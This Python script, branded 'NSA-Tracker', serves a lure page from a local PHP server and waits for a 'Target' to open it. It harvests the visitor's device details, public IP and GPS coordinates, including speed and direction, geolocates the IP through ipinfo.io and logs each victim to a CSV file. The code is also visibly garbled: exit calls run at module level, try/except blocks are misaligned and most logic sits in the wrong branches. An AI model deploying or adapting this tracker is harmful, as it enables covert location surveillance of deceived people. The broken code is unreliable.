#!/usr/bin/env python3
import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

R='\033[31m'
G='\033[32m'
C='\033[36m'
W='\033[0m'
### CopyRight MARcore SOFTWARE 2020-2021
## Released under MIT License
# Creator: Marius Sheppard

parser=argparse.ArgumentParser()
parser.add_argument('-k','--kml',help='Provide KML Filename [optional]')
parser.add_argument('-t','--tunnel',help='Specify Tunnel Mode [manual]')
args=parser.parse_args()
kml_fname=args.kml
tunnel_mode=args.tunnel

row=[]
site=''
info=''
result=''
version='1.0.0'

def banner():
 os.system('clear')
 print(G+
 r'''| \ | |/ ____|  /\    
     |  \| | (___   /  \   
     | . ` |\___ \ / /\ \  
     | |\  |____) / ____ \ 
     |_| \_|_____/_/    \_\
 '''+W)
 print('\n'+G+'[>]'+C+'Created By:'+W+'Marius Sheppard')
 print(G+'[>]'+C+'Version:'+W+version+'\n')


# Update Protocols
def ver_check():
 print(G+'[+]'+C+'Checking for Updates...',end='')
 try:
  ver_rqst=requests.get('https://raw.githubusercontent.com/Marius-Sheppard/NSA-Tracker/master/version.txt')
  ver_sc=ver_rqst.status_code
  if ver_sc==200:
   github_ver=ver_rqst.text
   github_ver=github_ver.strip()
   if version==github_ver:
    print(C+'['+G+'Systems Up-To-Date'+C+']'+'\n')
   else:
    print(C+'['+G+'Available:{}'.format(github_ver)+C+']'+'\n')
  else:
   print(C+'['+R+'Status:{}'.format(ver_sc)+C+']'+'\n')
 except Exception as e:
  print('\n'+R+'[-]'+C+'Exception:'+W+str(e))


# Tunnel Selection Protocol
def tunnel_select():
 if tunnel_mode==None:
  print(G+'[+]'+C+'Invalid Tunnel Mode'+W+'\n')
 if tunnel_mode=='manual':
  print(G+'[+]'+C+'Start tunnel service manually'+W+'\n')
 else:
  print(R+'[+]'+C+'Invalid Tunnel Mode Selected'+W+'\n')
exit()


# Template Select Protocol
def template_select():
  print(G+'[+]'+C+'Select a Tunel Constructor:'+W+'\n')
  print(G+'[1]'+C+'NSA'+W)
  selected=int(input(G+'[>]'+W))
  if selected==1:
   site='NSA'
   print('\n'+G+'[+]'+C+'Loading NSA...'+W)
  else:
   print(R+'[-]'+C+'Invalid Input'+W+'\n')
   info='template/{}/php/info.txt'.format(site)
   result='template/{}/php/result.txt'.format(site)


# Server Constructor
def server():
 print('\n'+G+'[+]'+C+'Starting PHP Server...'+W,end='')
 with open('logs/php.log','w') as phplog:
  subp.Popen(['php', '-S', '0.0.0.0:8080', '-t','template/{}/'.format(site)],stdout=phplog,stderr=phplog)
  time.sleep(3)
  try:
   php_rqst=requests.get('http://0.0.0.0:8080/index.html')
   php_sc=php_rqst.status_code
   if php_sc==200:
    print(C+'['+G+'Success'+C+']'+W)
   else:
    print(C+'['+R+'Status:{}'.format(php_sc)+C+']'+W)
  except requests.ConnectionError:
   print(C+'['+R+'Failed'+C+']'+W)
Quit()

# Wait For Target
def wait():
 printed=False
 while True:
  time.sleep(2)
  size=os.path.getsize(result)
  if size==0 and printed==False:
   print('\n'+G+'[+]'+C+'Waiting for Target...'+W+'\n')
   printed=True
   if size>0:
    main()


# Main
def main():
 try:
  row=[]
  with open (info, 'r') as file2:
   file2=file2.read()
   json3=json.loads(file2)
   for value in json3['dev']:
    var_os=value['os']
    var_platform=value['platform']
    var_lang=value['lang']
    var_on=value['on']
    var_prod=value['prod']
    try:
     var_cores=value['cores']
    except TypeError:
     var_cores='Not Available'
     var_ram=value['ram']
     var_vendor=value['vendor']
     var_render=value['render']
     var_res=value['wd'] + 'x' + value['ht']
     var_browser=value['browser']
     var_ip=value['ip']
     row.append(var_os)
     row.append(var_lang)
     row.append(var_on)
     row.append(var_prod)
     row.append(var_platform) 
     row.append(var_cores) 
     row.append(var_ram) 
     row.append(var_vendor)
     row.append(var_render)
     row.append(var_res)
     row.append(var_browser)
     row.append(var_ip)
     print(G+'[+]'+C+'Device     :'+W+'\n')
     print(G+'[+]'+C+'OS         :'+W+var_os)
     print(G+'[+]'+C+'Language   :'+W+var_lang)
     print(G+'[+]'+C+'Status     :'+W+var_on)
     print(G+'[+]'+C+'Product    :'+W+var_prod)
     print(G+'[+]'+C+'Platform   :'+W+var_platform)
     print(G+'[+]'+C+'CPU Cores  :'+W+var_cores)
     print(G+'[+]'+C+'RAM        :'+W+var_ram)
     print(G+'[+]'+C+'GPU Vendor :'+W+var_vendor)
     print(G+'[+]'+C+'GPU        :'+W+var_render)
     print(G+'[+]'+C+'Resolution :'+W+var_res)
     print(G+'[+]'+C+'Browser    :'+W+var_browser)
     print(G+'[+]'+C+'Public IP  :'+W+var_ip)
     rqst=requests.get('https://ipinfo.io/json'.format(var_ip))
     sc=rqst.status_code
     if sc==200:
      data=rqst.text
      data=json.loads(data)
      var_ipv=str(data['ip'])
      var_hostname=str(data['hostname'])
      var_city=str(data['city'])
      var_region=str(data['region'])
      var_country=str(data['country'])
      var_location=str(data['loc'])
      var_org=str(data['org'])
      var_postal=str(data['postal'])
      print(G+'[+]'+C+'IPv4       :'+W+var_ipv)
      print(G+'[+]'+C+'HostName   :'+W+var_hostname)
      print(G+'[+]'+C+'City       :'+W+var_city)
      print(G+'[+]'+C+'Region     :'+W+var_region)
      print(G+'[+]'+C+'Country    :'+W+var_country)
      print(G+'[+]'+C+'LAT LONG   :'+W+var_location)
      print(G+'[+]'+C+'ISP        :'+W+var_org)
      print(G+'[+]'+C+'ZIP        :'+W+var_postal)
    except ValueError:
     pass
	
    try:
     with open (result, 'r') as file:
      file=file.read()
      json2=json.loads(file)
      for value in json2['info']:
       var_lat=value['lat']+'deg'
       var_lon=value['lon']+'deg'
       var_acc=value['acc']+'m'
       var_alt=value['alt']
       if var_alt=='':
        var_alt='Not Available'
       else:
        var_alt==value['alt']+'m'
        var_dir=value['dir']
        if var_dir=='':
         var_dir='Not Available'
        else:
         var_dir=value['dir']+'deg'
         var_spd=value['spd']
         if var_spd=='':
          var_spd='Not Available'
         else:
          var_spd=value['spd']+'m/s'
          row.append(var_lat)
          row.append(var_lon)
          row.append(var_acc)
          row.append(var_alt)
          row.append(var_dir)
          row.append(var_spd)
          print ('\n'+G+'[+]'+C+'Location Information:'+W+'\n')
          print (G+'[+]'+C+'Latitude  :'+W+var_lat)
          print (G+'[+]'+C+'Longitude :'+W+var_lon)
          print (G+'[+]'+C+'Accuracy  :'+W+var_acc)
          print (G+'[+]'+C+'Altitude  :'+W+var_alt)
          print (G+'[+]'+C+'Direction :'+W+var_dir)
          print (G+'[+]'+C+'Speed     :'+W+var_spd)
    except ValueError:
     error=file
     print ('\n'+R+'[-]'+W+error)
     repeat()
     print ('\n'+G+'[+]'+C+'Google Maps.................:'+W+'https://www.google.com/maps/place/'+var_lat.strip(' deg')+'+'+var_lon.strip(' deg'))
     if kml_fname is not None:
      kmlout(var_lat, var_lon)
csvout()
repeat()


def kmlout(var_lat, var_lon):
 with open('template/sample.kml','r') as kml_sample:
  kml_sample_data=kml_sample.read()
  kml_sample_data=kml_sample_data.replace('LONGITUDE',var_lon.strip(' deg'))
  kml_sample_data=kml_sample_data.replace('LATITUDE',var_lat.strip(' deg'))
  with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
   kml_gen.write(kml_sample_data)
   print(G+'[+]'+C+'KML File Generated..........:'+W+os.getcwd()+'/{}.kml'.format(kml_fname))

# Database Print Functions
def csvout():
 global row
 with open('db/results.csv', 'a') as csvfile:
  writer=csv.writer(csvfile)
  writer.writerow(row)
  print(G+'[+]'+C+'New Entry Added in Database.:'+W+os.getcwd()+'/db/results.csv')

def clear():
 global result
 with open (result,'w+'):pass
 with open (info,'w+'):pass

def repeat():
 clear()
 wait()
 main()


def Quit():
 global result
 with open(result,'w+'):pass
  exit()
  try:
   banner()
   ver_check()
   tunnel_select()
   template_select()
   server()
   main()
  except KeyboardInterrupt:
   print('\n'+R+'[!]'+C+'Keyboard Interrupt.'+W)
   Quit()